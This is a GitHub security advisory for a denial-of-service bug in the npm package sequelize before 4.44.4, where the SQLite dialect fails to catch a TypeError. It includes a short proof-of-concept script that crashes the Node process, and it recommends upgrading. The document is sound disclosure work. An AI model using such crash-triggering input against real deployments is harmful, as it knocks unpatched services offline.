# [M] Denial of Service in sequelize

## Summary
Severity: Medium
Advisory: GHSA-fw4p-36j9-rrj3
CWE: CWE-248
Ecosystem: npm
Published: 2020-09-03
Source: https://github.com/advisories/GHSA-fw4p-36j9-rrj3
Type: github-advisory

## Affected
- npm: `sequelize` — affected >=0 <4.44.4

## Details
Versions of `sequelize` prior to 4.44.4 are vulnerable to Denial of Service (DoS). The SQLite dialect fails to catch a `TypeError` exception for the `results` variable. The `results` value may be undefined and trigger the error on a `.map` call. This may allow attackers to submit malicious input that forces the exception and crashes the Node process.  

The following proof-of-concept crashes the Node process:  
```
const Sequelize = require('sequelize');

const sequelize = new Sequelize({
	dialect: 'sqlite',
	storage: 'database.sqlite'
});

const TypeError = sequelize.define('TypeError', {
	name: Sequelize.STRING,
});

TypeError.sync({force: true}).then(() => {
	return TypeError.create({name: "SELECT tbl_name FROM sqlite_master"});
});
```


## Recommendation

Upgrade to version 4.44.4 or later.

## References
- https://github.com/sequelize/sequelize/pull/11877
- https://www.npmjs.com/advisories/1142
